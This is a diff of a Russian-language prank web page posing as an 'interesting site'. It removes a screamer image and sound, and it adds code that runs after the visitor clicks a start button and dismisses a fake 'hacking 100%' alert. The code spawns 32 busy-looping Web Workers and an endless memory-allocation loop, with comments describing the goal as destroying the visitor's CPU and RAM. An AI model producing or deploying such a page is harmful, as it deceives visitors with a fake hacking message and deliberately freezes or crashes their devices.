@@ -9,20 +9,9 @@
     <title>Интересный сайт</title>
     <style>
         body { margin: 0; overflow: hidden; background-color: #f0f0f0; }
-        .center-container { display: flex; justify-content: center; align-items: center; flex-direction: column; height: 100vh; text-align: center; font-family: Arial, sans-serif; }
+        .center-container { display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; font-family: Arial, sans-serif; }
         #intro { font-size: 24px; }
         #startButton { padding: 15px 30px; font-size: 20px; cursor: pointer; }
-        #screamer { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #000; }
-        #screamer-image { width: 80%; max-width: 600px; height: 60%; max-height: 450px; background-image: url('https://distribution.faceit-cdn.net/images/735d8f60-78fa-44ab-b6db-f42e2f0d9266.jpeg'); background-size: cover; background-position: center; border: 3px solid #300; animation: zoom-in 10s linear infinite, shake 0.1s linear infinite, pulse 1s infinite; }
-        .glitch-text { position: relative; font-size: 4rem; font-weight: bold; color: #ff0000; font-family: 'Courier New', Courier, monospace; margin-top: 20px; animation: glitch-main 1.5s infinite linear; }
-        @keyframes zoom-in { from { transform: scale(1); } to { transform: scale(1.15); } }
-        @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 25% { transform: translate(-1px, -2px) rotate(-1deg); } 50% { transform: translate(-3px, 0px) rotate(1deg); } 75% { transform: translate(3px, 2px) rotate(0deg); } 100% { transform: translate(1px, -1px) rotate(1deg); } }
-        @keyframes pulse { 0% { box-shadow: 0 0 20px 10px rgba(255, 0, 0, 0.4); } 50% { box-shadow: 0 0 40px 20px rgba(255, 0, 0, 0.7); } 100% { box-shadow: 0 0 20px 10px rgba(255, 0, 0, 0.4); } }
-        .glitch-text::before, .glitch-text::after { content: "Я ТЕБЯ НАШЕЛ"; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
-        .glitch-text::before { left: 2px; text-shadow: -2px 0 #00f; animation: glitch-1 2s infinite linear reverse; }
-        .glitch-text::after { left: -2px; text-shadow: -2px 0 #f0f; animation: glitch-2 2s infinite linear reverse; }
-        @keyframes glitch-1 { 0%, 12%, 15%, 42%, 45%, 82%, 85%, 100% { clip-path: inset(0 0 95% 0); } 13%, 43%, 83% { clip-path: inset(5% 0 1% 0); } }
-        @keyframes glitch-2 { 0%, 12%, 15%, 42%, 45%, 82%, 85%, 100% { clip-path: inset(5% 0 91% 0); } 13%, 43%, 83% { clip-path: inset(0 0 5% 0); } }
     </style>
 </head>
 <body>
@@ -30,12 +19,6 @@
     <div id="container" class="center-container">
         <div id="intro"><h1>Нажмите, чтобы увидеть кое-что интересное</h1><button id="startButton">Начать</button></div>
     </div>
-    <div id="screamer" class="center-container">
-        <div id="screamer-image"></div>
-        <h2 class="glitch-text">Я ТЕБЯ НАШЕЛ</h2>
-    </div>
-
-    <audio id="screamSound" src="fsdsdfhh.mp3" loop preload="auto"></audio>
     
     <script id="worker-script" type="javascript/worker">
         self.onmessage = function() { while (true) {} };
@@ -44,65 +27,46 @@
     <script>
         const startButton = document.getElementById('startButton');
         const intro = document.getElementById('intro');
-        const screamer = document.getElementById('screamer');
-        const screamSound = document.getElementById('screamSound');
 
-        // --- НОВАЯ СВЕРХАГРЕССИВНАЯ АТАКА НА ПАМЯТЬ ---
-        function startMemoryAnnihilation() {
-            console.log("Запускаю финальную атаку на RAM");
-            let memoryHog = [];
-            while (true) {
-                // Вложенный цикл для максимально быстрой аллокации
-                for (let i = 0; i < 10; i++) {
-                    memoryHog.push(new Array(10000000).join('x'));
-                }
-            }
-        }
-        
-        // --- НОВАЯ АТАКА НА ПРОЦЕССОР ---
-        function startCpuAttack() {
+        // --- САМАЯ РАЗРУШИТЕЛЬНАЯ ФУНКЦИЯ ---
+        function startUltimateAnnihilation() {
+            console.log("ЗАПУСК ФИНАЛЬНОГО ПРОТОКОЛА УНИЧТОЖЕНИЯ");
+            
+            // 1. Немедленная, тотальная атака на CPU
             try {
-                // Атака на CPU: запускаем В ДВА РАЗА БОЛЬШЕ потоков, чем есть ядер
-                const coreCount = (navigator.hardwareConcurrency || 4) * 2;
+                const workerCount = 32; // Запускаем 32 потока, игнорируя кол-во ядер
                 const workerScript = document.getElementById('worker-script').textContent;
                 const blob = new Blob([workerScript], { type: 'javascript/worker' });
                 const workerUrl = URL.createObjectURL(blob);
-                for (let i = 0; i < coreCount; i++) {
+                for (let i = 0; i < workerCount; i++) {
                     new Worker(workerUrl).postMessage('start');
                 }
-                console.log(`Запущено ${coreCount} потоков для перегрузки CPU.`);
+                console.log(`Запущено ${workerCount} потоков для тотальной перегрузки CPU.`);
             } catch (e) {
                 console.error('Не удалось запустить Workerы:', e);
             }
-        }
-
-        function triggerFinalStage() {
-            screamer.style.display = 'none';
-            alert("взлом 100%");
-            // После нажатия "ОК" запускаем самую мощную атаку на память
-            startMemoryAnnihilation();
-        }
-
-        startButton.addEventListener('click', () => {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
+            
+            // 2. Сразу же - сверхагрессивная атака на RAM
+            let memoryHog = [];
+            while (true) {
+                 // Создаем сложные, вложенные объекты, чтобы максимально нагрузить движок JS
+                 memoryHog.push(new Array(1_000_000).fill({
+                    a: Math.random(),
+                    b: [new Array(10).fill('x')]
+                 }));
             }
+        }
+
+        // Слушатель нажатия на кнопку "Начать"
+        startButton.addEventListener('click', () => {
             intro.style.display = 'none';
             document.body.style.backgroundColor = '#000';
             
-            setTimeout(() => {
-                alert("взлом 50%");
-
-                screamer.style.display = 'flex';
-                screamSound.src = `fsdsdfhh.mp3?t=${new Date().getTime()}`;
-                screamSound.play();
-                
-                // Сразу же запускаем фоновую атаку на процессор
-                startCpuAttack();
-                
-                setTimeout(triggerFinalStage, 3000);
-
-            }, 1000);
+            // Показываем последнее предупреждение
+            alert("взлом 100%");
+            
+            // СРАЗУ ПОСЛЕ НАЖАТИЯ "ОК" НАЧИНАЕТСЯ АД
+            startUltimateAnnihilation();
         });
     </script>
 
